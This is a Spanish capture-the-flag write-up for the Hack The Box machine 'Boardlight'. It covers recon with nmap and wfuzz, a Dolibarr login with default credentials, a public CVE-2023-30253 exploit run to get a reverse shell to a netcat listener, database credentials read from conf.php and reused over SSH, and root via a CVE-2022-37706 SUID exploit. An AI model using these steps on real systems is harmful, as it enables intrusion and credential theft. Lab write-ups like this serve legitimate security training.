---
tags:
title: Boardlight - Easy (HTB)
permalink: /Boardlight-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.231.37                         
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-23 22:12 -0500
Nmap scan report for 10.129.231.37
Host is up (0.39s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.43 seconds
```

## Website 

![image-center](/assets/images/Pasted image 20251224001257.png)
## Shell as www-data
### VHOST enumeration

Debido a que la pagina no tiene nada de nada porque es una pagina `estática`, me decidí por buscar por subdominios asociados a la `maquina`.

```bash
wfuzz -c -t 200 -H "Host: FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb --hc=404 --hw=1053
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://board.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
=====================================================================

000000072:   200        149 L    504 W      6360 Ch     "crm"
```

### Dashboard as admin

Agregue dicho subdominio al archivo `/etc/hosts`, y fui a la pagina, y me tope con este panel de `login` donde corre `Dolibarr`.

![image-center](/assets/images/Pasted image 20251224002414.png)
### CVE

Usando credenciales por defecto como `admin:admin` gane acceso al panel de administracion.

![image-center](/assets/images/Pasted image 20251224002404.png)

Ahora que tengo credenciales y se que usa la versión `17.0.0` puedo tratar de buscar `exploits` asociados a la misma, y es así como me cruce con este [enlace](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253).
Para el uso del mismo necesito el `usuario` y su `password`, así como también el puerto e `ip` desde la que voy a estar en escucha para poder recibir la `Reverse Shell`.

```bash
python3 exploit.py http://crm.board.htb admin admin 10.10.17.19 4444 
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```
## Shell as larissa

Y después de unos segundos obtuve la Shell como el usuario `www-data`.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.231.37] 50614
bash: cannot set terminal process group (837): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami
whoami
www-data
```
### Enumeration.

Dentro del directorio `/var/html/crm.board.htb/htdocs/conf` encontre un archivo de configuración de `php`, con unas credenciales para una base de datos `MySQL`.

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
<SNIP>
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
<SNIP>
```
### Auth

Antes de usar las mismas para la conexión a la base de datos, comprobé que sean validas para `ssh`.

```bash
 ssh larissa@board.htb                                                                
The authenticity of host 'board.htb (10.129.231.37)' can't be established.
larissa@board.htb's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

larissa@boardlight:~$ cat user.txt 
5d0f06c5d09222c5f0368cac15b2a05d
```
## Shell as root

Viendo por archivos `SUID` encontré 3 inusuales durante esta enumeración.

```bash
larissa@boardlight:~$ find / -perm -4000 2>/dev/null 
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```

Se tratar de los que están en la carpeta `/enlightment/utils`, los cuales parecen ser un binario, buscando por dicho nombre en `google` y vulnerabilidades asociadas a estos binarios encontré el siguiente [PoC](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) en el cual se detalla como se llego al mismo, para poder crear el mismo `exploit` que se encuentra en el repositorio.
### Shell 

Solo me basto con crear el mismo en el directorio `/tmp` para luego poder ejecutarlo, y asi ganar acceso como el usuario `root`.

```bash
larissa@boardlight:/usr/lib/x86_64-linux-gnu/enlightenment/utils$ cd /tmp/
larissa@boardlight:/tmp$ nano exploit.sh
larissa@boardlight:/tmp$ chmod +x exploit.sh 
larissa@boardlight:/tmp$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
```

```bash
# cat /root/root.txt    
7c68649eda8b4be99465becf45292dc8
```

`~Happy Hacking.`
